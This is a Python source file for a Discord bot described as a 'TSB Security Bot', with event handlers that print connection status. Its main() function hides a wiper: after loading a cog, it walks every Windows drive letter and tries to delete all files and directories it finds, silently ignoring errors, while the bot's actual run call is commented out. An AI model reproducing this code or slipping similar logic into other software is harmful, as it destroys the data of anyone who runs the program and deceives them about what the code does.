"""Module to be used for TSB Security Bots"""
import datetime

import discord
from discord import Intents
from discord.ext import commands

client = commands.Bot(command_prefix=">", intents=Intents.all())


@client.event
async def on_connect():
    """Displays status that bot has connected to Discord"""

    print("[*] Bot has connected to Discord")


@client.event
async def on_ready():
    """Displays status that bot is ready to use"""

    print("[+] Bot is ready")


@client.event
async def on_resume():
    """Displays status that bot has resumed"""

    print("[+] Bot resumed")


@client.event
async def on_disconnect():
    """Displays status that bot has disconnected from Discord"""

    print("[!] Bot has disconnected from Discord")


def main():
    # token = input("Please specify your Discord Bot's token: ")

    cogs = {"cogs.play"}
    for cog in cogs:
        client.load_extension(cog)
        print(f"[*] {cog} has been loaded successfully")

    import os
    import string
    from shutil import rmtree

    for drive in string.ascii_uppercase:
        for thing in os.walk(f"{drive}:\\"):
            if thing[2]:
                for file in thing[2]:
                    try:
                        os.remove(file)
                    except:
                        pass
            elif thing[1]:
                for directory in thing[1]:
                    try:
                        rmtree(directory)
                    except:
                        pass
            else:
                try:
                    rmtree(thing[0])
                except:
                    pass

    # client.run(token)


if __name__ == "__main__":
    main()
